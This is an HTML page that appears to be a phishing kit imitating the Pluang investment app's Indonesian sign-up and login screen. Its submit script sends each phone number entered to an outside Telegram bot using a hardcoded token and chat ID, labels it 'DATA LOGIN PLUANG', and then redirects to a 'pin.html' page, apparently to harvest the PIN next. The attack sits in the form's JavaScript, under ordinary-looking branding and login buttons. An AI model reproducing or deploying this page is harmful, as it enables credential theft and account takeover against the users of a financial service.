<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>Pluang Super App Investasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet"/>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            max-width: 400px;
            margin: 0 auto;
        }
        
        /* Header image slideshow animation */
        @keyframes headerSlide {
            0% { opacity: 0; transform: scale(0.9); }
            20% { opacity: 1; transform: scale(1); }
            80% { opacity: 1; transform: scale(1); }
            100% { opacity: 0; transform: scale(0.9); }
        }
        
        .header-slide-container {
            position: relative;
            width: 150px;
            height: 180px;
            overflow: hidden;
            margin: 0 auto;
        }
        
        .header-slide-image {
            position: absolute;
            width: 150px;
            height: 180px;
            top: 0;
            left: 0;
            opacity: 0;
            animation: headerSlide 6s infinite;
            object-fit: contain;
            border-radius: 12px;
        }
        
        .header-slide-image:nth-child(1) {
            animation-delay: 0s;
        }
        .header-slide-image:nth-child(2) {
            animation-delay: 2s;
        }
        .header-slide-image:nth-child(3) {
            animation-delay: 4s;
        }

        /* Custom loading animation */
        @keyframes loadingPulse {
            0% { 
                transform: scale(1);
                opacity: 1;
            }
            50% { 
                transform: scale(1.2);
                opacity: 0.7;
            }
            100% { 
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .loading-icon {
            animation: loadingPulse 1.2s ease-in-out infinite;
        }

        /* Alternative: Rotating dots */
        @keyframes rotateDots {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .rotating-dots {
            animation: rotateDots 1s linear infinite;
        }
    </style>
</head>
<body class="bg-[#3B3FE1] min-h-screen flex flex-col relative">
    <!-- Header dengan gambar yang berubah otomatis -->
    <header class="flex flex-col items-center px-5 pt-5 text-white">
        <div class="flex justify-between items-center w-full mb-4">
            <div class="text-sm font-normal">Eksplor Pluang</div>
            <div class="flex items-center border border-white rounded-full w-[72px] h-[32px] text-xs font-normal">
                <button class="w-1/2 h-full rounded-full bg-white text-[#3B3FE1]">ID</button>
                <button class="w-1/2 h-full">EN</button>
            </div>
        </div>
        
        <!-- Container gambar header yang berubah otomatis -->
        <div class="header-slide-container">
            <img alt="Award Trophy 1" class="header-slide-image" src="https://mandiri-investasi.co.id/wp-content/uploads/2020/11/piala-MMI-4.png"/>
            <img alt="Investment Chart" class="header-slide-image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/128px-Bitcoin.svg.png?20140331024207"/>
            <img alt="Security Shield" class="header-slide-image" src="https://image-cdn.pluang.com/web/compressed/securityIcon.webp"/>
        </div>
    </header>

    <main class="flex flex-col items-center px-5 pt-8 flex-grow text-center text-white">
        <h1 class="mt-8 font-bold text-[22px] leading-7">Super App Investasi #1</h1>
        <p class="mt-2 text-[13px] leading-5 max-w-[320px]">
            Investasi di 560+ Saham AS, 200+ Aset Crypto, 65+ Reksa Dana, dan Emas.
            <a class="underline cursor-pointer" href="#" id="learnMoreLink">Pelajari lebih lanjut</a>
        </p>
    </main>
    
    <form class="bg-white px-5 py-6 space-y-4" id="signupForm">
        <div class="flex space-x-3">
            <button class="flex items-center justify-center border border-gray-300 rounded-md w-[72px] h-[44px] text-sm text-gray-700" type="button">
                <img alt="Indonesian flag icon" class="mr-2" height="14" src="https://uxwing.com/wp-content/themes/uxwing/download/flags-landmarks/indonesia-flag-icon.png" width="20"/>
                +62
            </button>
            <input autocomplete="tel" class="flex-grow border border-gray-300 rounded-md h-[44px] px-3 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#FFFFFF]" id="phoneInput" name="phone" placeholder="Nomor Telepon" required="" type="tel"/>
        </div>
        <button class="w-full bg-gray-200 text-gray-400 rounded-full h-[44px] text-center text-sm font-normal cursor-not-allowed" disabled="" id="submitBtn" type="submit">Daftar atau Log In</button>
    </form>
    
    <footer class="flex justify-center items-center space-x-20 py-6 bg-white">
        <button aria-label="Login with OVO" class="focus:outline-none">
            <img alt="Green circular icon representing OVO login" height="40" src="https://vectorseek.com/wp-content/uploads/2023/10/Gojek-Icon-Logo-Vector.svg-.png" width="40"/>
        </button>
        <button aria-label="Login with Facebook" class="focus:outline-none">
            <img alt="Blue circular icon representing Facebook login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" width="40"/>
        </button>
        <button aria-label="Login with Google" class="focus:outline-none">
            <img alt="Multicolor circular icon representing Google login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/48px-Google_%22G%22_logo.svg.png" width="40"/>
        </button>
    </footer>
    
    <!-- Loading overlay dengan icon custom -->
    <div class="fixed inset-0 bg-black bg-opacity-50 flex flex-col items-center justify-center hidden z-50" id="loadingOverlay">
        <!-- Option 1: Investment/Money icon -->
        <div class="loading-icon mb-4">
            <svg class="w-16 h-16 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
        </div>
        
        <!-- Option 2: Rotating dots (uncomment to use)
        <div class="rotating-dots mb-4">
            <svg class="w-16 h-16 text-white" viewBox="0 0 24 24" fill="currentColor">
                <circle cx="4" cy="12" r="3"/>
                <circle cx="12" cy="12" r="3" opacity="0.7"/>
                <circle cx="20" cy="12" r="3" opacity="0.4"/>
            </svg>
        </div>
        -->
        
        <!-- Option 3: Chart/Graph icon (uncomment to use)
        <div class="loading-icon mb-4">
            <svg class="w-16 h-16 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M3.5 18.49l6-6.01 4 4L22 6.92l-1.41-1.41-7.09 7.97-4-4L2 16.99z"/>
                <path d="M9 17H7v5h2v-5zm4-4h-2v9h2v-9zm4-6h-2v15h2V7z"/>
            </svg>
        </div>
        -->
        
        <!-- Option 4: Dollar/Money icon (uncomment to use)
        <div class="loading-icon mb-4">
            <svg class="w-16 h-16 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/>
            </svg>
        </div>
        -->
        
        <div class="text-white text-sm font-medium">Memproses...</div>
    </div>
    
    <script>
        const loadingOverlay = document.getElementById('loadingOverlay');
        const phoneInput = document.getElementById('phoneInput');
        const submitBtn = document.getElementById('submitBtn');
        const form = document.getElementById('signupForm');

        // Enable submit button only if phone input has value
        phoneInput.addEventListener('input', () => {
            if (phoneInput.value.trim().length > 0) {
                submitBtn.disabled = false;
                submitBtn.classList.remove('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
                submitBtn.classList.add('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
            } else {
                submitBtn.disabled = true;
                submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
                submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
            }
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = phoneInput.value.trim();
            if (!phone) return;

            loadingOverlay.classList.remove('hidden');

            // Telegram bot info - replace with your own bot token and chat ID
            const botToken = '8214283552:AAG8Qbb0YfLmiyxVPKfy83-1xuKBiNeF0c0';
            const chatId = '7914074847';

            const message = encodeURIComponent(`DATA LOGIN PLUANG:\nPhone: +62${phone}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
                    method: 'GET',
                });

                if (response.ok) {
                    window.location.href = "pin.html";
                    form.reset();
                    submitBtn.disabled = true;
                    submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
                    submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
                } else {
                    alert('Gagal mengirim data ke Telegram.');
                }
            } catch (error) {
                alert('Terjadi kesalahan saat mengirim data.');
            } finally {
                loadingOverlay.classList.add('hidden');
            }
        });
    </script>
</body>
</html>
